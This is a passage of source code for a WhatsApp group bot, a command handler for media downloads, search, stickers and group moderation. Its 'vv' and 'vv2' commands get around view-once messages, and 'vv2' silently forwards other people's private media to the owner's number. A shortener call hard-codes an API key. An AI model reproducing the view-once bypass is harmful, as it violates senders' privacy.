    body: formData,
    headers: {
      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
      //...formData.getHeaders(),
    },
  });

  return await response.text();
}       

const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}



let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"))
const ednutdev = { ednut, isOwner, command, isCmd, isCmd2, text, runtime, mime, sleep, speed, botNumber, pushname, example, isGroup, groupMetadata, isBotAdmins, isGroupAdmins, isAdmins, reply4}
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, ednutdev)
}
}
if (!pluginsDisable) return

        
switch (command) {
        
case "play": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("_past lives_"))
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await ednut.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"},{quoted: m})
} else {
return m.reply("_Error! Result Not Found_")
}
}
break
//================================================================================

case "video": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("_past lives_"))
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp4(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await ednut.sendMessage(m.chat, {video: {url: urlMp3}, ptv: false, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("_Error! Result Not Found_")
}
}
break

//===============================================================================

case "yts": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example('_past lives_'))
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "*[ YouTube search result ⌛]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Duration :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
}
break

//===============================================================================

case "ytmp3": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("_youtube vid link_"))
if (!text.startsWith("https://")) return m.reply("_please input a valid youtube link_")

var anu = await ytdl.ytmp3(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await ednut.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
}
break

//================================================================================

case "ytmp4": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("_youtube vid link_"))
if (!text.startsWith("https://")) return m.reply("_please input a valid YouTube link_")
var anu = await ytdl.ytmp4(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await ednut.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("_Error! Result Not Found_")
}
}
break

//===============================================================================

case 'mediafire': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!args[0]) return m.reply(example("https://www.mediafire.com/file/xxxxxxxxxx"))
if (!args[0].startsWith("https://")) return m.reply("please input a valid mediafire link")
try {
let url = args[0]
let api = await fetch(`https://api.agatz.xyz/api/mediafire?url=${url}`)
let res = await api.json()
let data = res.data[0]
let caption = `*MediaFire Downloader* -\n_Name: ${data.nama}_\n_Size: ${data.size}_\n_Extension: ${data.mime}_\n_Link: ${data.link}_`
await ednut.sendMessage(m.chat, { document: { url: data.link }, mimetype: data.mime, fileName: data.nama, caption: caption }, { quoted: m })
} catch (error) {
console.log(error)
m.reply(error)
}
} 
break
//================================================================================

case "tiktokmp3": case "ttmp3": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("input tiktok link"))
if (!text.startsWith('https://')) return m.reply("the link you input is invalid")
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await ednut.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

case 'tourl': case 'url':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || '';
  if (!mime) return m.reply(example(`reply to a media`))
  let media = await q.download();
  let tmphasil = await tmpfiles(media)
  m.reply(`*Link*: ${tmphasil}`);
}
break

//================================================================================


case "gitclone": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("https://github.com/ednut001/arch-md"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link you input is invalid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    ednut.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! Repository not found`)
}}
break

//================================================================================


case "ssweb": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await ednut.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

case 'google': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
 if (!text) return m.reply(example('how to cook'))
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google result for: ${text}\n\n`
for (let g of res) {
teks += `*Title* : ${g.title}\n`
teks += `*Description* : ${g.snippet}\n`
teks += `*Link* : ${g.link}\n\n───────────────────\n\n`
} 
m.reply(teks)
})
}
break

//================================================================================

case "shortlink": case "shorturl": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
let res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `${res.data.toString()}`
return m.reply(link)
}
break


case "shortlink-dl": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await ednut.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//================================================================================

case "idgc": case "jid": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
m.reply(m.chat)
}
break

case 'gcinfo': case 'groupinfo': {
if (!m.isGroup) return m.reply(msg.group)

let metadata = await ednut.groupMetadata(m.chat)
// get group profile picture 
try {
ppgc = await ednut.profilePictureUrl(m.chat, 'image')
} catch (err) {
ppgc = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
    }
ppnyauser = await getBuffer(ppgc)
let group = metadata.id;
let subject = metadata.subject;
let members = metadata.size;
let owner = metadata.owner || 'no owner';
let desc = metadata.desc || 'no description';
let access = metadata.announce;
let check = metadata.joinApprovalMode;
let created = metadata.creation;
let community = metadata.isCommunity;
let welcome = global.db.groups[m.chat].welcome;
let goodbye = global.db.groups[m.chat].goodbye;
let antilink1 = global.db.groups[m.chat].antilink;
let antilink2 = global.db.groups[m.chat].antilink2;
let antilink3 = global.db.groups[m.chat].antilink3;
let antibot = global.db.groups[m.chat].antibot;
let antitag = global.db.groups[m.chat].antitag;
let antilinkAction;
if (antilink1 === true) {
  antilinkAction = 'kick';
} else if (antilink2 === true) {
  antilinkAction = 'delete';
} else if (antilink3 === true) {
  antilinkAction = 'warn';
}


let caption = `Name: ${subject}
id: ${group}
participant: ${members}
owner: ${owner}
announcement: ${access}
approval: ${check}
community: ${community}
created at: ${new Date(created * 1000).toLocaleString()}
description: ${desc}
welcome: ${welcome ? "on" : "off"}
Goodbye: ${goodbye ? "on" : "off"}
antilink: ${antilinkAction || 'off'}
antibot: ${antibot ? "on" : "off"}
antitag: ${antitag ? "on" : "off"}`

ednut.sendMessage(m.chat, { image: { url: ppgc }, caption: caption }, { quoted: m });
}
break

//================================================================================

case "listgc": case "listgroup": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return
let teks = `\n *乂 List all group chat*\n`
let a = await ednut.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Name :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Open": "closed"}
* *Owner :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Already out"}\n`
}
return m.reply(teks)
}
break

//================================================================================

//================================================================================

case 'sticker': case 's': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!/image|video/.test(mime)) return m.reply(example("reply to a image or video"))   
let getRandom = (ext) => {
return `${Math.floor(Math.random() * 10000)}${ext}`
  }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : (global.author)
	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await ednut.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await ednut.sendMessage(m.chat,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}
break
//================================================================================

case "vv": case "readviewonce": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
    if (!m.quoted) {
        return m.reply(`*Reply to an image, video, or audio with the caption ${prefix + command}*`);
    }

    let mime = (m.quoted.msg || m.quoted).mimetype || '';
    try {
        if (/image/.test(mime)) {
            let media = await m.quoted.download();
            await ednut.sendMessage(m.chat, {
                image: media,
                caption: "",
            }, { quoted: m });

        } else if (/video/.test(mime)) {
            let media = await m.quoted.download();
            await ednut.sendMessage(m.chat, {
                video: media,
                caption: "",
            }, { quoted: m });

        } else if (/audio/.test(mime)) {
            let media = await m.quoted.download();
            await ednut.sendMessage(m.chat, {
                audio: media,
                mimetype: 'audio/mpeg',
                ptt: true // Set to true if you want to send as a voice note
            }, { quoted: m });

        } else {
            m.reply(`❌ Unsupported media type!\nReply to an image, video, or audio with *${prefix + command}*`);
        }
    } catch (err) {
        console.error('Error processing media:', err);
        m.reply(`❌ Failed to process media. Please try again.`);
    }
}
break

case "vv2": case "readviewonce2": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
    if (!m.quoted) {
        return m.reply(`*Reply to an image, video, or audio with the caption ${prefix + command}*`);
    }

    let mime = (m.quoted.msg || m.quoted).mimetype || '';
    try {
        if (/image/.test(mime)) {
            let media = await m.quoted.download();
            await ednut.sendMessage(botNumber, {
                image: media,
                caption: " ",
            }, { quoted: m });

        } else if (/video/.test(mime)) {
            let media = await m.quoted.download();
            await ednut.sendMessage(botNumber, {
                video: media,
                caption: "",
            }, { quoted: m });

        } else if (/audio/.test(mime)) {
            let media = await m.quoted.download();
            await ednut.sendMessage(botNumber, {
                audio: media,
                mimetype: 'audio/mpeg',
                ptt: true // Set to true if you want to send as a voice note
            }, { quoted: m });

        } else {
            m.reply(`❌ Unsupported media type!\nReply to an image, video, or audio with *${prefix + command}*`);
        }
    } catch (err) {
        console.error('Error processing media:', err);
        m.reply(`❌ Failed to process media. Please try again.`);
    }
}
break

case 'lyrics': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
    if (!text) return m.reply("❌ *Please provide a song name.*");
     try {
        const apiUrl = `https://draculaZyx-xyzdrac.hf.space/api/Lyrics/?text=${encodeURIComponent(q)}`;
        const response = await axios.get(apiUrl);
        const { artist, song_name, thumbnail, lyrics } = response.data;

        let caption = `🎶 *Lyrics Found!* 🎶\n\n`;
        caption += `🎤 *Artist:* ${artist}\n`;
        caption += `🎵 *Song:* ${song_name}\n\n`;
        caption += `📜 *Lyrics:*\n${lyrics}`;

        await ednut.sendMessage(m.chat, { image: { url: thumbnail }, caption: caption }, { quoted: m });
    } catch (error) {
        console.error("Error fetching lyrics:", error);
        m.reply("❌ Error fetching lyrics. Please try again later.");
    }
} 
break;


//================================================================================

case "tr": case "translate": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("en good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("en good night"))
if (args.length < 1) return m.reply(example("en good night"))
if (!m.quoted.text) return m.reply(example("en good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("en good night"))
}}
break

//================================================================================

case "tohd": case "hd": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
try {
    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || ''
    
    if (!mime.startsWith('image/')) return m.reply('Please send pictures with caption *hd/remini* or reply pictures!!')

    let media = await q.download()
    if (!media) return m.reply('Failed to download image..')

    let upscaledUrl = await upscale(media)
    if (!upscaledUrl) return m.reply('Failed to HD image')

    await ednut.sendMessage(m.chat, {
      image: { url: upscaledUrl },
      caption: `© ᴀʀᴄʜ ᴍᴅ ²⁵`
    }, { quoted: m })

  } catch (error) {
    await ednut.reply(m.chat, `*Error:* ${error.message}`, m)
  }
}
break

//================================================================================
case "add": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isOwner) return m.reply(msg.owner)
if (!isBotAdmins) return m.reply(msg.botAdmin)
let input;
if (m.quoted) {
input = m.quoted.sender;
} else if (text) {
input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;
} else {
return m.reply(example("234### or reply to the user's message"))
}
var onWa = await ednut.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("input a valid whatsapp number")
const metadata = await ednut.groupMetadata(m.chat)
const members = metadata.participants.map(p => p.id)
if (members.includes(input)) {
return m.reply(`${input.split("@")[0]} is already in the group.`)
} else {
await ednut.groupParticipantsUpdate(m.chat, [input], 'add')
return m.reply(`User ${input.split("@")[0]} added to the group chat`)
}
} 
break
//================================================================================

case "kick": case "fling": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!m.isGroup) return m.reply(msg.group)
  if (!isOwner && !isAdmins) return m.reply(msg.admin)
  if (!isBotAdmins) return m.reply(msg.botAdmin)
  if (text || m.quoted) {
    const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
    var onWa = await ednut.onWhatsApp(input.split("@")[0])
    if (onWa.length < 1) return m.reply("Input a valid WhatsApp number")
    const metadata = await ednut.groupMetadata(m.chat)
    const members = metadata.participants.map(p => p.id)
    if (!members.includes(input)) {
      await m.reply(`User ${input.split("@")[0]} is not in the group.`)
    } else {
      const res = await ednut.groupParticipantsUpdate(m.chat, [input], 'remove')
      await m.reply(`User ${input.split("@")[0]} removed from the group chat.`)
    }
  } else {
    return m.reply(example("@tag/reply"))
  }
} 
break
//================================================================================

case "leave": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!isOwner) return m.reply(msg.owner)
  if (!m.isGroup) return m.reply(msg.group)
  await sleep(2000)
  await ednut.groupLeave(m.chat)
} 
break

case "resetlinkgc":  
case "revoke": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (!m.isGroup) return m.reply(msg.group)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (!isOwner && !isAdmins) return m.reply(msg.admin)
await ednut.groupRevokeInvite(m.chat)
m.reply("Group link reset successfully ✅")
}
break

//================================================================================
case 'tagall': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!m.isGroup) return m.reply(msg.group)
  if (!isBotAdmins) return m.reply(msg.botAdmin)
  if (!isOwner && !isAdmins) return m.reply(msg.admin)
let teks = `Message : ${text ? text : 'none'}\n\n`
for (let mem of participants) {
teks += `${global.simbol} @${mem.id.split('@')[0]}\n`
}
await ednut.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break

case 'tagadmin': case 'listadmin': case 'admin':{
if (!isGroup) return reply(msg.group)
const groupAdmins = participants.filter(p => p.admin)
const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
${listAdmin}
`.trim()
await ednut.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
}
break

//================================================================================

case "linkgc": 
case "grouplink":  {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isBotAdmins) return m.reply(msg.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await ednut.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await ednut.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "joingc": case "join": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("group link"))
if (!text.includes("chat.whatsapp.com")) return m.reply("the given link is invalid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await ednut.groupAcceptInvite(result)
m.reply(`Successfully joined the group`)
}
break

//================================================================================

case "get": case "g": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

//================================================================================

case "mute":
case "close": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!m.isGroup) return m.reply(msg.group)
  if (!isBotAdmins) return m.reply(msg.botAdmin)
  if (!isOwner && !isAdmins) return m.reply(msg.admin)
  if (groupMetadata.announce == false) {
    await ednut.groupSettingUpdate(m.chat, 'announcement')
    m.reply(`Group has been muted!`)
  } else {
    m.reply(`Group is already muted!`)
  }
} 
break;

case "unmute":
case "open": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!m.isGroup) return m.reply(msg.group)
  if (!isBotAdmins) return m.reply(msg.botAdmin)
  if (!isOwner && !isAdmins) return m.reply(msg.admin)
  if (groupMetadata.announce == true) {
    await ednut.groupSettingUpdate(m.chat, 'not_announcement')
    m.reply(`Group has been opened!`)
  } else {
    m.reply(`Group is already open!`)
  }
} 
break;


//================================================================================


case "ednut": case "creator": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
await ednut.sendContact(m.chat, ['2347036214381'], m)
}
break


//================================================================================

case "ping": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
m.reply('_checking response..._')
await sleep(2000)
let respon = `_*• pong:* ${latensi.toFixed(4)} sec_`
await m.reply(respon)
}
break

//================================================================================

case "addsudo": case "setsudo": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (setsudo.includes(orang)) return m.reply(`_User ${orang.split('@')[0]} existed as a sudo before_`)
await setsudo.push(orang)
await fs.writeFileSync("./all/database/owner.json", JSON.stringify(setsudo))
m.reply(`_succesfully added ${orang.split('@')[0]} as a sudo number_`)
} else {
return m.reply(example("/@tag/234XXX/reply to chat"))
}}
break

case "delsudo": case "removesudo":  {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!setsudo.includes(orang)) return m.reply(`_User ${orang.split('@')[0]} not founded as a sudo before_`)
let indx = setsudo.indexOf(orang)
await setsudo.splice(indx, 1)
await fs.writeFileSync("./all/database/owner.json", JSON.stringify(setsudo))
m.reply(`_succesfully deleted ${orang.split('@')[0]} from sudo number_`)
} else {
return m.reply(example("@tag/234XXX/reply to chat"))
}}
break

case "listsudo": case "getsudo": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (setsudo.length < 1) return m.reply("No sudo Number yet in Arch")
let teksnya = `Sudo Number here\n`
setsudo.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
await ednut.sendMessage(m.chat, {text: teksnya, mentions: [... setsudo]}, {quoted: m})
}
break

case 'request':{
				if (!m.isGroup) return m.reply(msg.group);
				if (!isBotAdmins) return m.reply(msg.botAdmin);
				if (!isAdmins) return m.reply(msg.admin);
				const response = await ednut.groupRequestParticipantsList(m.chat);
				if (!response || !response.length) {
					ednut.sendMessage(m.chat, {text: 'No pending join requests. ✅'}, {quoted:m});
					return;
				}
				let replyMessage = `Join Request List:\n`;
				response.forEach((request, index) => {
					const { jid, request_method, request_time } = request;
					const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
					replyMessage += `\n*No.: ${index + 1} Request Details. 👇*`;
					replyMessage += `\n*JID:* ${jid}`;
					replyMessage += `\n*Method:* ${request_method}`;
					replyMessage += `\n*Time:* ${formattedTime}\n`;
				});
				ednut.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
			};
			break

case 'approve': {
if (m.isGroup) {
  if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
try {
       if (!m.isGroup) return m.reply(msg.group)
	 if (!isBotAdmins) return await m.reply(msg.botAdmin)
     if (!isAdmins) return message.reply(msg.admin)
     const total = await ednut.groupRequestParticipantsList(m.chat);
     if (!total || !total[0]) {
       return await m.reply("No pending participant Yet");
     }
     let reqs2 = [];
     let mssg = "Accepted user\n\n";
     for (let i = 0; i < total.length; i++) {
       try {
         await ednut.groupRequestParticipantsUpdate(m.chat, [total[i].jid], "approve");
         mssg += "@" + total[i].jid.split("@")[0] + "\n";
         reqs2 = [...reqs2, total[i].jid];
       } catch {}
     }
    await ednut.sendMessage(m.chat, {
       text: mssg,
       mentions: [reqs2]
     });
   } catch (err) {
     await m.reply(err.toString());
   }
   }
 break
 
case "kickall":
if (m.isGroup) {
  if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (!isAdmins || !isOwner) return m.reply(msg.admin)
let users = participants.filter((u) => !areJidsSameUser(u.id, ednut.user.id)); 
   let kickedUser = []; 
   for (let user of users) { 
     if (user.id.endsWith("@s.whatsapp.net") && !user.admin) { 
       await kickedUser.push(user.id); 
       await sleep(1 * 1000); 
     } 
   } 
   if (!kickedUser.length >= 1) 
     return m.reply("In this group there are no members except you and me"); 
   const res = await ednut.groupParticipantsUpdate(m.chat, kickedUser, "remove"); 
   await sleep(3000); 
   await m.reply( 
     `sucessfully kicked member\n${kickedUser.map( 
       (v) => "@" + v.split("@")[0] 
     )}`, 
     null, 
     { 
       mentions: kickedUser, 
     } 
   ); 
break;

case 'mode': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (args[0] === 'public') {
if (global.db.settings.mode === false) {
m.reply('Bot mode is already set to Public!')
} else {
global.db.settings.mode = false
m.reply('Bot mode changed to Public!')
}
} else if (args[0] === 'private') {
if (global.db.settings.mode  === true) {
m.reply('Bot mode is already set to Private!')
} else {
global.db.settings.mode = true
m.reply('Bot mode changed to Private!')
}
} else if (args[0] === 'group') {
if (global.db.settings.onlygroup) {
m.reply('already activated!')
} else {
global.db.settings.onlygroup = true
global.db.settings.onlypc = false
m.reply('Only group mode activated!')
}
} else if (args[0] === 'pc') {
if (global.db.settings.onlypc) {
m.reply('already activated!')
} else {
global.db.settings.onlypc = true
global.db.settings.onlygroup = false
m.reply('Only pc mode activated!')
}
} else if (args[0] === 'off') {
global.db.settings.onlypc = false
global.db.settings.onlygroup = false
await m.reply('Succesfully deactivated only pc/ only group')
} else {
m.reply(example('public/private/group/pc/off'))
}
}
break


case 'demote': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins || !isOwner) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (!m.quoted && !text) return m.reply(example("tag/reply chat"))
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
const groupMetadata = await ednut.groupMetadata(m.chat)
const groupAdmins = groupMetadata.participants.filter(p => p.admin).map(p => p.id)
if (!groupAdmins.includes(users)) return m.reply(`@${users.split('@')[0]} is not an admin in this group.`)
await ednut.groupParticipantsUpdate(m.chat, [users], 'demote')
await m.reply(`@${users.split('@')[0]} has been dismissed as an administrator in ${groupMetadata.subject}`)
}
break

case 'promote': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins || !isOwner) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (!m.quoted && !text) return m.reply(example("tag/reply chat"))
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
const groupMetadata = await ednut.groupMetadata(m.chat)
